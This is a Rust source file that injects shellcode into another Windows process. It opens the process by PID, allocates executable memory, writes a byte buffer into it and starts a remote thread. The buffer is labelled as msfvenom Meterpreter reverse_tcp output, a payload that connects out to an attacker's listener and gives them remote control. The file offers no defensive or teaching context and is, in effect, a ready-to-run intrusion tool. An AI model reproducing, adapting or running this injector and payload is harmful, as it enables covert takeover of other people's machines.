use std::{os::raw::{c_uint, c_void}, ptr::null_mut};

type Handle = *mut c_void;
type Win32Error = u32;

const PROCESS_ALL_ACCESS: u32 = 0xF01FF;
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const INFINITE: u32 = 0xFFFFFFFF;

#[link(name="kernel32")]
extern {
    fn GetLastError() -> Win32Error;
    fn OpenProcess(dwDesiredAccess: u32, bUnheritHandle: bool, dwProcessId: u32) -> Handle;
    fn VirtualAllocEx(hProcess: Handle, lpAddress: *mut c_void, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut c_void;
    fn WriteProcessMemory(hProcess: Handle, lpBaseAddress: *mut c_void, lpBuffer: *const c_void, nSize: usize, lpNumberOfBytesWritten: *mut c_uint) -> bool;
    fn CreateRemoteThread(hProcess: Handle, lpThreadAttributes: *mut c_void, dwStackSize: usize, lpStartAddress: *const c_void, lpParameter: *mut c_void, dwCreationFlags: u32, lpThreadId: *mut c_uint) -> Handle;
    fn WaitForSingleObject(handler: Handle, dwMilliseconds: u32) -> u32;
}

fn open_process(dw_desired_access: u32, b_unherit_handle: bool, dw_process_id: u32) -> Result<Handle, Win32Error>{

    let h_process = unsafe { OpenProcess(dw_desired_access, b_unherit_handle, dw_process_id) };

    if h_process.is_null(){
        Err( unsafe { GetLastError() })
    }else{
        Ok(h_process)
    }
}

fn virtual_alloc_ex(h_process: Handle, lp_address: *mut c_void, dw_size: usize, fl_allocation_type: u32, fl_protect: u32) -> Result<*mut c_void, Win32Error>{
    let r_buffer = unsafe { VirtualAllocEx(
    h_process,
   lp_address,
      dw_size,
              fl_allocation_type,
   fl_protect)
    };

    if r_buffer == null_mut(){
        Err(unsafe { GetLastError() })
    }else{
        Ok(r_buffer)
    }

}

fn write_process_memory(h_process: Handle, lp_base_address: *mut c_void, lp_buffer: *const c_void, n_size: usize, lp_number_of_bytes_written: *mut c_uint) -> Result<(), Win32Error>{
    let is_success = unsafe { WriteProcessMemory(h_process, lp_base_address, lp_buffer, n_size, lp_number_of_bytes_written) };

    if !is_success || n_size != unsafe { *lp_number_of_bytes_written } as usize{
        Err(unsafe { GetLastError() })
    }else{
        Ok(())
    }
}

fn create_remote_thread(h_process: Handle, lp_thread_attributes: *mut c_void, dw_stack_size: usize, lp_start_address: *const c_void, lp_parameter: *mut c_void, dw_creation_flags: u32, lp_thread_id: *mut c_uint) -> Result<Handle, Win32Error> {
    let h_thread = unsafe { CreateRemoteThread(
        h_process,
        lp_thread_attributes,
        dw_stack_size,
        lp_start_address,
        lp_parameter,
        dw_creation_flags,
        lp_thread_id) };

    if h_thread.is_null(){
        Err(unsafe { GetLastError() } )
    }else{
        Ok(h_thread)
    }
}

fn main() {
    let args = std::env::args().collect::<Vec<_>>();
    
    if args.len() < 2 {
        eprintln!("Usage: {} <pid>", args[0]);
        std::process::exit(1);
    }
    let pid = args[1].parse::<u32>().unwrap_or_else(|_| {
        eprintln!("Provided pid is invalid!");
        std::process::exit(1);
    });

    let h_process = open_process(PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|c| {
        eprintln!("Error: {:?}", c);
        std::process::exit(2);
    });

    println!("Process {} was opened {:?}", pid, h_process);

    let r_buffer = virtual_alloc_ex(
        h_process,
        null_mut(),
        BUF.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE).unwrap_or_else(|c| {
            eprintln!("Error: {:?}", c);
            std::process::exit(3);
        });

    println!("Memory was allocated: {:?}", r_buffer);
    let mut lp_number_of_bytes_written : u32 = 0;
    write_process_memory(
        h_process,
        r_buffer,
        BUF.as_ptr() as *const c_void,
        BUF.len(),
        &mut lp_number_of_bytes_written as *mut u32 as *mut c_uint).unwrap_or_else(|c| {
            eprintln!("Error: {:?}", c);
            std::process::exit(4);

        });

    println!("The shellcode was injected");

    let h_thread = create_remote_thread(
        h_process,
        null_mut(),
        0,
        r_buffer, null_mut(),
        0,
        null_mut()).unwrap_or_else(|c| {
            eprintln!("Error: {:?}", c);
            std::process::exit(5);
        });

    println!("The shellcode started executing. Thread handler: {:?}", h_thread);
    println!("The waiting for remote thread is started");

    unsafe{ WaitForSingleObject(h_thread, INFINITE) };

}


// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f rust
const BUF: [u8; 510] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,
0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,
0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,
0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,0x01,0xd0,0x66,0x81,
0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,
0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0x50,0xe3,
0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,0x01,
0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,
0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,
0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,
0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,
0xa8,0x01,0x61,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,
0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,
0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,
0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,
0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,
0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,
0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,
0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,
0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,
0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,
0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,
0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,
0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,0x00,
0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,
0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,
0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,
0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,
0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5];
